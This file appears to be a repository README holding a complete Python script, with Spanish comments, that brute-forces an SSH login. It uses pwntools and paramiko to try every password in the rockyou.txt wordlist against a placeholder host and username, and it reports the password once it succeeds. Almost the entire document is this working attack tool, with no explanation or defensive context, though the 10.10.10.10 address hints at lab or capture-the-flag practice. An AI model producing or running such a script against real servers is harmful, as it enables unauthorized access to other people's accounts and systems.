# Python3-SSH-Brute-Force


```

from pwn import *
import paramiko


def exploit():
	intentos = 0
	target = "10.10.10.10" #Cambiar esto
	user = "user" #Cambiar esto

	with open ("rockyou.txt", "r") as password_list:
		for password in password_list:
			password = password.strip("\n")
			try:
				print ("[{}] Intentando con: '{}'".format(intentos,password))
				ssh_connect = ssh(host=target,user=user,password=password,timeout=1)
				if ssh_connect.connected():
					print("[+] El password es: '{}'".format(password))
					ssh_connect.close()
					break
				ssh_connect.close()
			except paramiko.ssh_exception.AuthenticationException:
				print("[-] No es correcta")
			intentos += 1 



if __name__=="__main__":
	exploit()

```
